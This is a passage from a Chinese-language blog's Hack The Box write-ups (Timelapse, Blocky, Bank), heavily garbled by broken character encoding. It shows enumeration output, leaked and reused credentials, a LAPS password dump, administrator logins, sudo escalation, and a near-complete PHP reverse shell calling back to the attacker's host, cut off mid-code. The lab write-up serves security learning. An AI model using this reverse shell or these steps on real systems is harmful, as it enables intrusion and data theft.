LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential (&#39;svc_deploy&#39;, $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit å°è¯•ä½¿ç”¨ laps.py æ¥è¿›è¡Œæ“ä½œ https://github.com/n00py/LAPSDumper/blob/main/laps.py é¦–å…ˆå°†æ·»åŠ ä¸€ä¸ªæœ¬åœ° DNS è§£æ echo 10.10.11.152 timelapse.htb &gt;&gt; /etc/hosts ç„¶åæ‰§è¡Œ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# python3 laps.py -u svc_deploy -p &#39;E3R$Q62^12p7PLlC%KWaxuaV&#39; -d timelapse.htb DC01$:C9(3OIh923TK13J.iADjN))A æ‹¿åˆ°äº†ä¸€ä¸ªå¯†ç  ç»§ç»­ä½¿ç”¨ evil-winrm ç™»å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Timelapse] â””â”€# evil-winrm -i 10.10.11.152 -S -u Administrator -p &#39;C9(3OIh923TK13J.iADjN))A&#39; Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami timelapse\\administrator æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª administrator æƒé™ *Evil-WinRM* PS C:\\users\\TRX\\Desktop&gt; cat root.txt 365b8463a586a128c09558558d4deceb æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Blocky - Hackthebox","slug":"Hackthebox - Blocky","date":"2022-03-31T11:38:36.000Z","updated":"2023-05-20T01:23:13.000Z","comments":true,"path":"2022/03/31/Hackthebox - Blocky/","link":"","permalink":"http://www.lucifiel.com/2022/03/31/Hackthebox%20-%20Blocky/","excerpt":"","text":"Hackthebox - Blockyé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Blocky] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.37 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 23:15 EDT Nmap scan report for 10.10.10.37 Host is up (0.46s latency). Not shown: 65530 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA) | 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA) |_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft â€“ Under Construction! 8192/tcp closed sophos 25565/tcp open minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20) Device type: general purpose|WAP|specialized|storage-misc|printer Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (88%), HP embedded (88%) OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:3.4 Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.13 (93%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8192/tcp) HOP RTT ADDRESS 1 535.09 ms 10.10.16.1 2 535.21 ms 10.10.10.37 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 163.96 seconds è¿™å°æœ‰ç‚¹æ„æ€ï¼Œçœ‹èµ·æ¥åƒæ˜¯ Minectfatï¼ˆæˆ‘çš„ä¸–ç•Œï¼‰è¿™æ¬¾æ¸¸æˆçš„ä¸€å°æœåŠ¡å™¨ Http è¿™å°æœ‰ç‚¹æ„æ€çš„ï¼Œå¾€ä¸‹ç¿»å¯ä»¥çœ‹åˆ°æ˜¯ wordpress æ­å»ºçš„ï¼Œå»åšä¸ª wpscan WPScanâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# wpscan --url http://10.10.10.37/ _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.37/ [10.10.10.37] [+] Started: Mon Mar 28 23:21:07 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.10.37/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://10.10.10.37/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; | - http://10.10.10.37/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/ | Last Updated: 2022-01-25T00:00:00.000Z | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.9 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: &#39;Version: 1.3&#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:20 &lt;=====================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:20 [i] No Config Backups Found. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Mon Mar 28 23:21:31 2022 [+] Requests Done: 139 [+] Cached Requests: 37 [+] Data Sent: 34.403 KB [+] Data Received: 19.875 KB [+] Memory used: 224.391 MB [+] Elapsed time: 00:00:23 æ²¡çœ‹åˆ°ä»€ä¹ˆç‰¹åˆ«æ˜æ˜¾çš„å¯ç”¨çš„æ¼æ´ï¼Œå» fuzz ä¸€ä¸‹ç›®å½•çœ‹çœ‹ Fuzzâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.10.37/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.37/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ wp-includes [Status: 301, Size: 316, Words: 20, Lines: 10] wp-content [Status: 301, Size: 315, Words: 20, Lines: 10] plugins [Status: 301, Size: 312, Words: 20, Lines: 10] wp-admin [Status: 301, Size: 313, Words: 20, Lines: 10] javascript [Status: 301, Size: 315, Words: 20, Lines: 10] wiki [Status: 301, Size: 309, Words: 20, Lines: 10] phpmyadmin [Status: 301, Size: 315, Words: 20, Lines: 10] server-status [Status: 403, Size: 299, Words: 22, Lines: 12] [Status: 200, Size: 52256, Words: 3306, Lines: 314] :: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:12:10] :: Errors: 6 :: æœ‰ä¸€ä¸ª phpmyadmin ç›®å½•ï¼Œå»å°è¯•ä¸€ä¸‹ ä½¿ç”¨é»˜è®¤å£ä»¤ç™»å½•å¤±è´¥ æ¼æ´åˆ©ç”¨æ¼æ´å‘ç°ç„¶åçœ‹åˆ°æœ‰ä¸€ä¸ª plugins ç›®å½•ï¼Œå»çœ‹çœ‹æ’ä»¶ è¿™é‡Œæœ‰ä¸€ä¸ª BlockyCore.jar ä¸‹è½½ä¸‹æ¥çœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Blocky/BlockyCore] â””â”€# ls BlockyCore.jar â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Blocky/BlockyCore] â””â”€# unzip BlockyCore.jar Archive: BlockyCore.jar inflating: META-INF/MANIFEST.MF inflating: com/myfirstplugin/BlockyCore.class â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Blocky/BlockyCore] â””â”€# ls BlockyCore.jar com META-INF â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Blocky/BlockyCore] â””â”€# cd com â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/Easy/Blocky/BlockyCore/com] â””â”€# ls -la æ€»ç”¨é‡ 12 drwxr-xr-x 3 root root 4096 3æœˆ 29 00:25 . drwxr-xr-x 4 root root 4096 3æœˆ 29 00:25 .. drwxr-xr-x 2 root root 4096 3æœˆ 29 00:25 myfirstplugin â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/Easy/Blocky/BlockyCore/com] â””â”€# cd myfirstplugin â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/Blocky/BlockyCore/com/myfirstplugin] â””â”€# ls -la æ€»ç”¨é‡ 12 drwxr-xr-x 2 root root 4096 3æœˆ 29 00:25 . drwxr-xr-x 3 root root 4096 3æœˆ 29 00:25 .. -rw-r--r-- 1 root root 939 7æœˆ 2 2017 BlockyCore.class è§£å‹å‡ºæ¥äº†ï¼Œå»ä½¿ç”¨ java çš„åç¼–è¯‘å™¨ jd-gui æŸ¥çœ‹ä¸€ä¸‹ apt install jd-gui å®‰è£… jd-gui package com.myfirstplugin; public class BlockyCore { public String sqlHost = &quot;localhost&quot;; public String sqlUser = &quot;root&quot;; public String sqlPass = &quot;8YsqfCTnvxAUeduzjNSXe22&quot;; public void onServerStart() {} public void onServerStop() {} public void onPlayerJoin() { sendMessage(&quot;TODO get username&quot;, &quot;Welcome to the BlockyCraft!!!!!!!&quot;); } public void sendMessage(String username, String message) {} } ä½¿ç”¨ jd-gui æ‰“å¼€ BlockyCore.class åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª sql çš„è´¦å·å’Œå¯†ç  æ­£å¥½æˆ‘ä»¬æœ‰ phpmyadmin å»ç™»é™†ä¸€ä¸‹ ç™»å½•æˆåŠŸ æ—¢ç„¶è¿™ä¸ªè´¦å·å¯ä»¥ç™»å½• sql æ•°æ®åº“ï¼Œé‚£è¯æ˜è‚¯å®šæ˜¯ä¸€ä¸ªç³»ç»Ÿè´¦æˆ·ï¼Œé‚£æˆ‘ä»¬æ˜¯å¦å¯ç”¨è¿™ä¸ªç³»ç»Ÿè´¦æˆ·è¿›è¡Œç™»å½• ssh å‘¢ï¼Ÿå»å°è¯•ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh root@10.10.10.37 The authenticity of host &#39;10.10.10.37 (10.10.10.37)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.37&#39; (ECDSA) to the list of known hosts. root@10.10.10.37&#39;s password: Permission denied, please try again. root@10.10.10.37&#39;s password: Permission denied, please try again. root@10.10.10.37&#39;s password: ç™»å½•å¤±è´¥äº†ï¼Œé‚£æ˜¯å¦æ˜¯å…¶ä»–è´¦å·çš„å‘¢ï¼Ÿæˆ‘ä»¬ç›®å‰ä¹Ÿæ²¡æœ‰å…¶ä»–è´¦å·ï¼Œå»è·å–ä¸€ä¸‹ è´¦å·è·å– é¦–å…ˆå¯ä»¥çœ‹åˆ°å”¯ä¸€ä¸€ç¯‡æ–‡ç« çš„å‘å¸ƒäººæ˜¯ NOTCHï¼ˆMinecraft è¿™æ¬¾æ¸¸æˆçš„åˆ›å§‹äººï¼‰ é‚£ä»–å¾ˆå¯èƒ½å°±æ˜¯ä¸€ä¸ªè´¦å·ï¼ŒåŒæ—¶æˆ‘ä»¬å»æ•°æ®åº“å†…ä¹Ÿçœ‹ä¸€ä¸‹ åœ¨æ•°æ®åº“å†…ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰ NOTCH è¿™ä¸€ä¸ªè´¦å·ï¼Œæˆ‘æƒ³åº”è¯¥å°±æ˜¯äº†ï¼Œå»å°è¯•ä¸€ä¸‹å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh notch@10.10.10.37 130 â¨¯ notch@10.10.10.37&#39;s password: Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 7 packages can be updated. 7 updates are security updates. Last login: Sun Dec 24 09:34:35 2017 notch@Blocky:~$ whoami&amp;&amp;id notch uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) ç™»å½•æˆåŠŸ notch@Blocky:~$ cat user.txt 59fee0977fb60b8a0bc6e41e751f3cd5 æˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡notch@Blocky:~$ sudo -l [sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User notch may run the following commands on Blocky: (ALL : ALL) ALL æŸ¥çœ‹ä¸€ä¸‹ sudo -lï¼Œæˆ‘ä»¬çš„ NOTCH è´¦æˆ·æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œé‚£ç›´æ¥ææƒå§ notch@Blocky:~$ sudo su root@Blocky:/home/notch# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ° root æƒé™ root@Blocky:/home/notch# cat /root/root.txt 0a9694a5b4d272c694679f7860f1cd5f æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Bank - Hackthebox","slug":"Hackthebox - Bank","date":"2022-03-30T11:38:36.000Z","updated":"2023-05-20T01:20:43.000Z","comments":true,"path":"2022/03/30/Hackthebox - Bank/","link":"","permalink":"http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/","excerpt":"","text":"Hackthebox - Banké¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Bank] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.29 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 01:51 EDT Nmap scan report for 10.10.10.29 Host is up (0.53s latency). Not shown: 63750 filtered ports, 1782 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA) | 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA) | 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA) |_ 256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519) 53/tcp open tcpwrapped | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open tcpwrapped |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=3/28%OT=80%CT=7%CU=30511%PV=Y%DS=2%DC=T%G=Y%TM=62414DA OS:A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=8 OS:)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(O1=M54BST11NW7%O2=M54B OS:ST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1 OS:=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210% OS:O=M54BNNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R= OS:Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=% OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40% OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A OS:=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 991.53 ms 10.10.16.1 2 233.51 ms 10.10.10.29 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190.30 seconds Http ç›´æ¥è®¿é—® ip åœ°å€ï¼Œä¼šè¿›å…¥ apache çš„é»˜è®¤é¡µé¢ï¼ŒåŒæ—¶æˆ‘ä»¬çœ‹åˆ° 53 ç«¯å£æ‰“å¼€ç€ï¼Œå¾ˆå…¸å‹çš„ DNS æœåŠ¡å™¨ï¼Œæ·»åŠ ä¸€ä¸ªè§£æ echo 10.10.10.29 bank.htb ç„¶åå»è®¿é—®ä¸€ä¸‹ è¿™å°±æœ‰é¡µé¢äº†ï¼Œå» fuzz ä¸€ä¸‹ç›®å½• Fuzzâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://bank.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://bank.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ uploads [Status: 301, Size: 305, Words: 20, Lines: 10] assets [Status: 301, Size: 304, Words: 20, Lines: 10] inc [Status: 301, Size: 301, Words: 20, Lines: 10] balance-transfer [Status: 301, Size: 314, Words: 20, Lines: 10] å‰ä¸‰ä¸ªéƒ½æ²¡ä¸œè¥¿ï¼Œå’±ä»¬å»çœ‹çœ‹ç¬¬å››ä¸ª balance-transfer æœ‰å¾ˆå¤šçš„ .acc ç»“å°¾çš„æ–‡ä»¶ï¼Œå»çœ‹ä¸€ä¸ª è¿™çœ‹èµ·æ¥åƒæ˜¯å­˜å‚¨çš„ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯éƒ½æ˜¯åŠ å¯†çš„ï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ä¹Ÿæ— æ³•è§£å¯†å‡ºæ¥ï¼Œå¤šæ‰¾æ‰¾çœ‹ import requests import re response = requests.get(&quot;http://bank.htb/balance-transfer/&quot;) html = response.text urls = re.findall(&#39;&lt;a href=&quot;(.*?acc)&quot;&gt;.*?acc&lt;/a&gt;&#39;, html) x = 1 y = len(urls) - 1 for url in urls: url = &#39;http://bank.htb/balance-transfer/&#39; + url name = url.split(&#39;/&#39;)[-1] response = requests.get(url) with open(name, &quot;wb&quot;) as f: f.write(response.content) print(&#39;ã€%sã€‘ ä¸‹è½½å®Œæ¯• å½“å‰å®Œæˆä»»åŠ¡ï¼š%s æ¬¡ è¿˜å‰©ä»»åŠ¡ %s æ¬¡&#39; % (url, x, y)) x += 1 y -= 1 ç”±äºæ•°é‡æœ‰ç‚¹å¤šï¼Œæ‰€ä»¥æˆ‘å†™äº†ä¸ªç®€å•çš„çˆ¬è™«æ¥è‡ªåŠ¨ä¸‹è½½æ–‡ä»¶ ä¸€å…± 999 ä¸ªç”¨æˆ·ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹æœ‰æ²¡æœ‰æ²¡æœ‰åŠ å¯†çš„æ¼ç½‘ä¹‹é±¼ â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider] â””â”€# grep -r &#39;bank.htb&#39; ./ ./68576f20e9732f1b2edc4df5b8533230.acc:Email: chris@bank.htb çˆ¬è™«çˆ¬å®Œäº†ï¼Œæœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰ bank.htb é‚®ç®±çš„å†…å®¹ï¼Œè¿˜çœŸæœåˆ°äº†ä¸€ä¸ª â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Bank/Spider] â””â”€# cat 68576f20e9732f1b2edc4df5b8533230.acc --ERR ENCRYPT FAILED +=================+ | HTB Bank Report | +=================+ ===UserAccount=== Full Name: Christos Christopoulos Email: chris@bank.htb Password: !##HTBB4nkP4ssw0rd!## CreditCards: 5 Transactions: 39 Balance: 8842803 . ===UserAccount=== æŸ¥çœ‹ä¸€ä¸‹å†…å®¹ï¼ŒæˆåŠŸæ‹¿åˆ°ä¸€ä¸ªå¯ä»¥ç”¨çš„è´¦å·å¯†ç  å»ç™»å½•ä¸€ä¸‹åå°çœ‹çœ‹ æˆåŠŸè¿›å…¥åå° ä¸»é¡µä¸Šæ²¡ä»€ä¹ˆåŠŸèƒ½ç‚¹ï¼Œå°±ä¸€ä¸ªæ”¯æŒï¼Œç„¶ååœ¨æ”¯æŒé‡Œé¢æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ç›´æ¥ä¸Šä¼  phpwebshellï¼Œä¸Šä¼ å¤±è´¥ã€‚æˆ‘ä»¬å»çœ‹çœ‹ç½‘é¡µæºç  åœ¨ 95 è¡Œå‘ç°è¿™ä¹ˆä¸€å¥ å°†ä¼šæŠŠ .htb æ ¼å¼çš„æ–‡ä»¶ä»¥ .php æ ¼å¼æ¥è¿è¡Œï¼ŒOKï¼Œæ€è·¯æœ‰äº† æ¼æ´åˆ©ç”¨&lt;?php set_time_limit (0); $VERSION = &quot;1.0&quot;; $ip = &#39;10.10.16.4&#39;; // CHANGE THIS $port = 4444; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &#39;uname -a; w; id; /bin/bash -i&#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(&#39;pcntl_fork&#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(&quot;ERROR: Can&#39;t fork&quot;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(&quot;Error: Can&#39;t setsid()&quot;); exit(1); } $daemon = 1; } else { printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;); } // Change to a safe directory chdir(&quot;/&quot;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&quot;$errstr ($errno)&quot;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), // stdin is a pipe that the child will read from 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), // stdout is a pipe that the child will write to 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&quot;ERROR: Can&#39;t spawn shell&quot;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&quot;Successfully opened reverse shell to $ip:$port&quot;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(&quot;ERROR: Shell connection terminated&quot;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(&quot;ERROR: Shell process terminated&quot;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process&#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); } // If we can read from the process&#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); } // 